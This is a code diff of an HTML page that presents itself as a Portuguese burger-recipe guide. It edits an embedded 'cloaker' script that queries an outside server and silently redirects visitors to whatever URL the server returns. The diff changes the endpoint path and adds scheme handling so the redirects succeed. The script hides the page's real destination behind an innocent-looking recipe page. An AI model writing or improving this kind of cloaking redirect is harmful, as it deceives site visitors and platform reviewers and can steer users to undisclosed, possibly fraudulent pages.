@@ -7,7 +7,7 @@
     <meta name="description" content="O guia definitivo do Burgz: blend ideal, técnica da chapa e suculência máxima para o hambúrguer perfeito em casa." />
 <script>
 (function() {
-  const endpoint = "https://meu-cloaker.vercel.app/api/";
+  const endpoint = "https://meu-cloaker.vercel.app/api/filtrar";
   const whiteUrl = "";
   
   fetch(endpoint, {
@@ -23,7 +23,11 @@
   .then(res => res.json())
   .then(data => {
     if (data.action === 'redirect' && data.url) {
-      window.location.href = data.url;
+      let url = data.url;
+      if (!/^https?:\/\//i.test(url)) {
+        url = 'https://' + url;
+      }
+      window.location.href = url;
     } else if (whiteUrl) {
       window.location.href = whiteUrl;
     }
